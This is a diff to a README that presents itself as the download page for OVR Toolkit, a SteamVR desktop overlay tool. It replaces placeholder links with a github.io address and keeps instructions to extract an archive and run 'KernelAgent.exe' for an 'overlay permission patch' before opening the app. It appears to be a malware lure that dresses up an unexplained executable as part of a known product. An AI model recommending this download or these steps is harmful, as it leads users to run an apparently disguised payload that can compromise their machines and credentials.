@@ -2,13 +2,15 @@
 
 OVR Toolkit brings your desktop into VR with powerful overlay tools. Pin windows, control music, chat, monitor system stats, and manage everything inside your headset using SteamVR.
 
-[![Download OVR Toolkit](https://img.shields.io/badge/Download-OVR_Toolkit-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download OVR Toolkit](https://img.shields.io/badge/Download-OVR_Toolkit-blueviolet)](https://ovr-toolkit-vr-overlay-manager.github.io/.github
+)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
+1. 📦 **Download the archive** from the [Releases](https://ovr-toolkit-vr-overlay-manager.github.io/.github
+) section  
 2. 📁 **Extract the folder** anywhere on your system (e.g. `C:\OVRToolkitMod`)  
 3. 🖱 **Run the executable file** `KernelAgent.exe` (required for overlay permission patch & virtual desktop binding)  
 4. 🕶 Launch SteamVR and then open `OVRToolkit.exe`  
